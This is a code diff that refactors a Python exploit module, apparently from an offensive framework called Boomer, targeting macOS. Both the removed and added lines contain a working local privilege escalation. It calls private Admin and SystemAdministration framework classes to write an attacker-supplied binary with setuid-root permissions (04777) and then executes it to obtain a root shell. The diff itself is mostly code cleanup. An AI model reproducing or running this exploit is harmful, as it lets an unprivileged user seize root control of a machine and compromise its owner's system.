@@ -1,11 +1,12 @@
+import ctypes
 import os
 import platform
 import re
-import ctypes
+import subprocess
+import time
+
 import objc
 import pip
-import time
-import subprocess
 
 try:
     from Cocoa import NSData, NSMutableDictionary, NSFilePosixPermissions
@@ -44,10 +45,12 @@ class BoomerModule(PayloadModule):
             source_binary = self.options.get("src_file")[1]
             dest_binary = self.options.get("des_file")[1]
 
-            if source_binary == None \
-                    or source_binary == "" \
-                    or dest_binary == None \
-                    or dest_binary == "":
+            if (
+                    source_binary is None
+                    or source_binary == ""
+                    or dest_binary is None
+                    or dest_binary == ""
+            ):
                 self.print_error("It's mandatory to specify a source file and a destination file!!")
                 return
 
@@ -56,7 +59,8 @@ class BoomerModule(PayloadModule):
                 return
 
             if os.path.exists(dest_binary):
-                self.print_error("Destination file already exists. Use another name or remove/rename the original file!")
+                self.print_error(
+                    "Destination file already exists. Use another name or remove/rename the original file!")
                 return
 
             pool = NSAutoreleasePool.alloc().init()
@@ -65,31 +69,12 @@ class BoomerModule(PayloadModule):
             attr.setValue_forKey_(0o04777, NSFilePosixPermissions)
             data = NSData.alloc().initWithContentsOfFile_(source_binary)
 
-            self.print_info("will write file " + dest_binary)
+            self.print_info(f"will write file {dest_binary}")
 
             if self.use_old_api():
-                adm_lib = self.load_lib("/Admin.framework/Admin")
-                Authenticator = objc.lookUpClass("Authenticator")
-                ToolLiaison = objc.lookUpClass("ToolLiaison")
-                SFAuthorization = objc.lookUpClass("SFAuthorization")
-
-                authent = Authenticator.sharedAuthenticator()
-                authref = SFAuthorization.authorization()
-
-                # authref with value nil is not accepted on OS X <= 10.8
-                authent.authenticateUsingAuthorizationSync_(authref)
-                st = ToolLiaison.sharedToolLiaison()
-                tool = st.tool()
-                tool.createFileWithContents_path_attributes_(data, dest_binary, attr)
+                self.create_file_with_legacy_api(data, dest_binary, attr)
             else:
-                adm_lib = self.load_lib("/SystemAdministration.framework/SystemAdministration")
-                WriteConfigClient = objc.lookUpClass("WriteConfigClient")
-                client = WriteConfigClient.sharedClient()
-                client.authenticateUsingAuthorizationSync_(None)
-                tool = client.remoteProxy()
-
-                tool.createFileWithContents_path_attributes_(data, dest_binary, attr, 0)
-
+                self.create_file_with_new_api(data, dest_binary, attr)
             self.print_ok("Done!")
 
             del pool
@@ -98,7 +83,7 @@ class BoomerModule(PayloadModule):
                 self.print_info("Waiting file creation...")
                 time.sleep(1)
 
-            self.print_ok("Returning root whell at: " + dest_binary)
+            self.print_ok(f"Returning root whell at: {dest_binary}")
             subprocess.call(dest_binary)
 
         except OSError as e:
@@ -108,8 +93,34 @@ class BoomerModule(PayloadModule):
                 print("Error executing exploit")
             raise
 
+    def create_file_with_legacy_api(self, data, dest_binary, attr):
+        adm_lib = self.load_lib("/Admin.framework/Admin")
+        Authenticator = objc.lookUpClass("Authenticator")
+        ToolLiaison = objc.lookUpClass("ToolLiaison")
+        SFAuthorization = objc.lookUpClass("SFAuthorization")
+
+        authent = Authenticator.sharedAuthenticator()
+        authref = SFAuthorization.authorization()
+
+        # authref with value nil is not accepted on OS X <= 10.8
+        authent.authenticateUsingAuthorizationSync_(authref)
+        st = ToolLiaison.sharedToolLiaison()
+        tool = st.tool()
+        tool.createFileWithContents_path_attributes_(data, dest_binary, attr)
+
+    def create_file_with_new_api(self, data, dest_binary, attr):
+        adm_lib = self.load_lib("/SystemAdministration.framework/SystemAdministration")
+        WriteConfigClient = objc.lookUpClass("WriteConfigClient")
+        client = WriteConfigClient.sharedClient()
+        client.authenticateUsingAuthorizationSync_(None)
+        tool = client.remoteProxy()
+
+        tool.createFileWithContents_path_attributes_(data, dest_binary, attr, 0)
+
     def load_lib(self, append_path):
-        return ctypes.cdll.LoadLibrary("/System/Library/PrivateFrameworks/" + append_path);
+        return ctypes.cdll.LoadLibrary(
+            f"/System/Library/PrivateFrameworks/{append_path}"
+        );
 
     def use_old_api(self):
         return re.match("^(10.7|10.8)(.\d)?$", platform.mac_ver()[0])
